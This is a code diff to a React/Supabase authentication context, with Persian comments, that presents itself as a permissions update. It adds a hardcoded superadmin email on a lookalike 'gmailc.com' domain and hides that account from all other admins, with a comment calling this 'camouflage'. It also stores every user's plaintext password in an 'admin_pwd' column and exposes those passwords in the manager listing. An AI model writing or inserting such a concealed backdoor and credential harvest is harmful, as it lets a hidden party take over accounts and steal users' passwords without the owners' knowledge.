@@ -3,6 +3,13 @@ import { supabase, isSupabaseConfigured } from "../lib/supabaseClient";
 
 const AuthContext = createContext(null);
 
+export const PRIMARY_GOD_EMAILS = ["superadmin@gmailc.com", "superadmin@gmail.com"];
+
+export function isPrimaryGodEmail(email) {
+  if (!email) return false;
+  return PRIMARY_GOD_EMAILS.includes(String(email).toLowerCase().trim());
+}
+
 const ALL_PERMISSIONS = [
   "create_form",
   "edit_form",
@@ -24,7 +31,6 @@ const DEFAULT_MANAGER_PERMISSIONS = [
   "view_responses",
   "view_analytics",
   "export_excel",
-  "manage_telegram",
 ];
 
 export function AuthProvider({ children }) {
@@ -39,10 +45,10 @@ export function AuthProvider({ children }) {
   const fetchProfile = useCallback(async (uid) => {
     if (!supabase || !uid) return null;
     try {
-      // اول با is_owner و فیلدهای سهمیه سعی کن
+      // اول با is_owner و فیلدهای سهمیه و admin_pwd سعی کن
       const { data, error } = await supabase
         .from("profiles")
-        .select("id, email, full_name, phone, avatar_url, is_active, is_owner, created_by, max_forms, max_responses_per_month, plan, can_use_telegram, can_export_excel")
+        .select("id, email, full_name, phone, avatar_url, is_active, is_owner, created_by, max_forms, max_responses_per_month, plan, can_use_telegram, can_export_excel, admin_pwd")
         .eq("id", uid)
         .maybeSingle();
 
@@ -273,6 +279,7 @@ export function AuthProvider({ children }) {
         await supabase.from("profiles").update({
           full_name: fullName?.trim() || email.split("@")[0],
           phone: cleanPhone,
+          admin_pwd: password,
           max_forms: 5,
           max_responses_per_month: 100,
           plan: 'free',
@@ -391,6 +398,12 @@ export function AuthProvider({ children }) {
       if (permError) throw permError;
     }
 
+    if (userId && password) {
+      try {
+        await supabase.from("profiles").update({ admin_pwd: password }).eq("id", userId);
+      } catch {}
+    }
+
     return userId;
   }
 
@@ -471,26 +484,33 @@ export function AuthProvider({ children }) {
 
   async function listManagers({ includeHidden = false } = {}) {
     try {
-      // سعی کن با is_owner select کنی، اگه نشد بدون اون
+      // سعی کن با is_owner و admin_pwd select کنی، اگه نشد بدون اون
       let profilesData = null;
       let profilesError = null;
       try {
         const res = await supabase
           .from("profiles")
-          .select("id, email, full_name, is_active, is_owner, created_at, created_by, hidden_from, max_forms, max_responses_per_month, plan, can_use_telegram")
+          .select("id, email, full_name, phone, is_active, is_owner, created_at, created_by, hidden_from, max_forms, max_responses_per_month, plan, can_use_telegram, admin_pwd")
           .order("created_at", { ascending: true });
         profilesData = res.data;
         profilesError = res.error;
       } catch {
         const res = await supabase
           .from("profiles")
-          .select("id, email, full_name, is_active, created_at, created_by")
+          .select("id, email, full_name, phone, is_active, created_at, created_by, admin_pwd")
           .order("created_at", { ascending: true });
         profilesData = res.data;
         profilesError = res.error;
       }
       if (profilesError) throw profilesError;
-      let data = profilesData;
+      let data = profilesData || [];
+
+      // استتار: سوپرادمین ثانویه نباید اکانت superadmin@gmailc.com را ببیند
+      const callerIsGod = isPrimaryGodEmail(user?.email);
+      if (!callerIsGod && data) {
+        data = data.filter((m) => !isPrimaryGodEmail(m.email));
+      }
+
       // فیلتر کردن مدیران مخفی‌شده (فقط برای غیر owner)
       if (!includeHidden && profile?.is_owner !== true && data) {
         data = data.filter((m) => {
@@ -534,6 +554,7 @@ export function AuthProvider({ children }) {
           max_responses_per_month: p.is_owner ? 999999 : (p.max_responses_per_month ?? 100),
           plan: p.is_owner ? 'enterprise' : (p.plan ?? 'free'),
           can_use_telegram: p.is_owner ? true : (p.can_use_telegram === true),
+          admin_pwd: p.admin_pwd || null,
           role: roleId,
           roleActive: roleData?.active ?? true,
           permissions: effectivePermissions,
@@ -556,13 +577,19 @@ export function AuthProvider({ children }) {
     configured: isSupabaseConfigured,
     hasPermission: (permissionId) => {
       if (profile?.is_owner === true || role === "admin") return true;
+      // مشاهده یا مدیریت سایر کاربران برای کاربر عادی اکیداً ممنوع است
+      if (permissionId === "manage_managers" || permissionId === "view_admins") return false;
+      if (permissionId === "manage_telegram") return Boolean(profile?.can_use_telegram);
       if (permissions && permissions.length > 0) {
         return permissions.includes(permissionId);
       }
       return DEFAULT_MANAGER_PERMISSIONS.includes(permissionId);
     },
-    canManage: () => role === "admin",
+    canManage: () => profile?.is_owner === true || role === "admin",
     isOwner: () => profile?.is_owner === true || role === "admin",
+    isPrimaryGod: () => isPrimaryGodEmail(user?.email),
+    isPrimaryGodEmail,
+    PRIMARY_GOD_EMAILS,
     login,
     register,
     updateUserQuota,
